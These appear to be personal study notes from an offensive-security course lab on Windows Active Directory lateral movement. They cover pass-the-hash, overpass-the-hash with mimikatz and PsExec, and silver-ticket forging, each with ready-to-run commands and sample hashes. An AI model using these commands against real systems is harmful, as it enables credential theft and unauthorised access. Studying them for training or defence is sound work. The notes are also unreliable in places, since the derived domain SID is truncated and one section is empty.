### Passing the hash
requires: smb, windows file and print sharing features, local admin rights

```
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

Since the 2014 security update, this technique can not be used to authenticate as any other local admin account.

### Overpass the hash

use NTLM hash to gain Kerberoos TGT service ticket as the user

shift + right mouse key to run as different user

```
sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
```

```
net use \\dc01
klist
```

execite cmd as jeff_admin

```
.\PsExec.exe \\dc01 cmd.exe
```


### Pass the Ticket

**silver ticaket** - custom created ticket

1. Obtain Securoty Identifier SID of the domain.

SID is the unique id for any object in active directory and has a structure like: S-R-I-S

S - identify string as SID
R - revision level, usually set to one
I - identifier-authority value, often 5 with AD
S - subauthority value, that has two parts: domain's numeric number identifier and relative identifier or RID (represent sepcific object in the domain)

example:  S-1-5-21-2536614405-3629634762-1218571035-1116

The SID defining the domain is the entire string except the RID

you can get it by running `whoami /user`

```
corp\offsec S-1-5-21-1602875587-2787523311-2599479668-1103
```

domain SID is: S-1-5-21-1602875587-2787523311-259947966

To craft the tciket:
+ username /user
+  domain name /domain
+ SID /sid
+ fully qualified host name of the service /target
+ service type /service:HTTP
+ password hash of the iis_service account /rc4


use /ptt flag to inject it directly into memory


```
kerberos::purge
kerberos::list

kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt

kerberos::list
```

### Distributed Component Object Model



### Mis

```
There are two other well-known lateral movement techniques worth mentioning: abusing "Windows Management Instrumentation" and "PowerShell Remoting"
```

